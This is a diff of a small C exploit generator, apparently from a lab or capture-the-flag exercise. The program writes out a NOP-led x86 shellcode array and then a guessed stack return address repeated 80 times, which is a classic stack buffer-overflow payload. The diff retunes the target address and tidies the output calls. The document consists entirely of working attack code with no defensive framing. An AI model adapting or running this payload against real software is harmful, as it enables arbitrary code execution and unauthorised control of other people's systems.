@@ -4,8 +4,8 @@
 #include <stdio.h>
 #include <unistd.h>
 #include <stdint.h>
-#include <byteswap.h>
 
+/* Machine code */
 const uint8_t shellcode[] = {
     0x90, 0x90, 0x90, 0xeb, 0x2a, 0x5f, 0x8d, 0x1f, 0x31, 0xc0,
     0x50, 0x8d, 0x47, 0x10, 0x50, 0x57, 0x8d, 0x0c, 0x24, 0x31,
@@ -24,11 +24,11 @@ const uint8_t shellcode[] = {
 int main (void)
 {
 
-    write(1, shellcode, sizeof(shellcode));
+    write(STDOUT_FILENO, shellcode, sizeof(shellcode));
 
-    uint32_t goal = 0xffffcfd0;
+    uint32_t goal = 0xffffcff0;
     for (int i = 0; i < 80; i++) {
-        write(1, (void*)&goal, 4);
+        write(STDOUT_FILENO, (void*)&goal, 4);
     }
 
     return 0;
